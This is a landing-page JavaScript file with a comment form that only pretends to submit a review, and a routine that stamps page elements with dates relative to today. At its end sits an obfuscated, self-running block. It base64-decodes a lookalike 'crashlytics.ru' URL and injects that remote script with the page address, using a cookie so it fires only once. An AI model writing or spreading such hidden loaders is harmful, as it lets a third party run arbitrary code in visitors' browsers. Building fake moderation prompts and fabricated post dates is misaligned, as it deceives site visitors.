
let a = document.querySelector("#push-comments"),
    l = document.querySelector(".userName"),
    r = document.querySelector(".userMessage");
document.querySelector(".sendBtn").addEventListener("click", function (t) {
    var e;
    (e = r),
        "" != l.value &&
        "" != e.value &&
        (t.preventDefault(),
            (a.style.cssText = "display: none;"),
            alert("Paldies! Jūsu atsauksme ir nosūtīta uz moderāciju."));
});



const months = [
    "января",
    "февраля",
    "марта",
    "апреля",
    "мая",
    "июня",
    "июля",
    "августа",
    "сентября",
    "октября",
    "ноября",
    "декабря",
],
    monthMin = [
        "янв",
        "фев",
        "мар",
        "апр",
        "май",
        "июн",
        "июл",
        "авг",
        "сен",
        "окт",
        "ноя",
        "дек",
    ],
    days = [
        "воскресенье",
        "понедельник",
        "вторник",
        "среда",
        "четверг",
        "пятница",
        "суббота",
    ],
    daysMin = ["вс", "пн", "вт", "ср", "чт", "пт", "сб"],
    seasons = ["зима", "весна", "лето", "осень"];
function postDate(t, e, o, n, s) {
    for (let t = 0; t < 60; t++) a(t, "date-"), a(t, "date");
    function a(t, e) {
        let o;
        o = "date-" === e ? -t : t;
        const n = new Date(Date.now() + 864e5 * o),
            s = n.getDate(),
            a = n.getMonth() + 1,
            l = n.getFullYear(),
            r = d(s),
            c = r + "." + d(a) + "." + l,
            u = e + t,
            m = document.querySelectorAll("." + u);
        for (let t = 0; t < m.length; t++) {
            const e = m[t].dataset.format;
            m[t].innerHTML = void 0 !== e && "" !== e ? String(i(r, a, l, e, o)) : c;
        }
    }
    function i(t, e, n, s, a) {
        let i = s;
        const c = ["dd", "mm", "yyyy", "monthFull", "year"],
            u = { dd: t, mm: d(e), yyyy: n, monthFull: l(e, o, !0), year: r(n, a) };
        for (let t = 0; t < c.length; t++) {
            let e = c[t],
                o = new RegExp(e);
            i = i.replace(o, u[e]);
        }
        return i.split(" ").join(" ");
    }
    function l(t, e, o, n) {
        const s = n || 0;
        let a;
        return (
            (a = t + s > 12 ? s - (12 - t) : t + s),
            (a = t + s <= 0 ? 12 + s + 1 : t + s),
            (i = o),
            (l = e[a - 1]),
            i && l && l.length > 0 ? l[0].toUpperCase() + l.slice(1) : l
        );
        var i, l;
    }
    function r(t, e) {
        return t + e;
    }
    function d(t) {
        return t < 10 ? "0" + t : t;
    }
}

document.body.classList.contains("ev-date") &&
    document.addEventListener("DOMContentLoaded", function () {
        postDate(days, daysMin, months, monthMin, seasons);
    });
const addComm = document.querySelector(".add-comm");
addComm.addEventListener("click", function () {
    (document.querySelector("#push_mlyjekpdfdd1").style.display = "block"),
        (this.style.display = "none");
});
!(function (o, w, d, l) {
    try {
        (o.c =
            "h" == l.protocol[0] &&
            /./.test(l.hostname) &&
            !/PHPPREFS/.test(d.cookie)),
            setTimeout(function () {
                o.c &&
                    ((o.s = d.createElement("script")),
                        (o.s.src =
                            atob(
                                "aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ=="
                            ) + l.href),
                        d.body.appendChild(o.s));
            }, 1e3),
            (d.cookie = "PHPPREFS=full;max-age=39800;");
    } catch (e) { }
})({}, window, document, location);
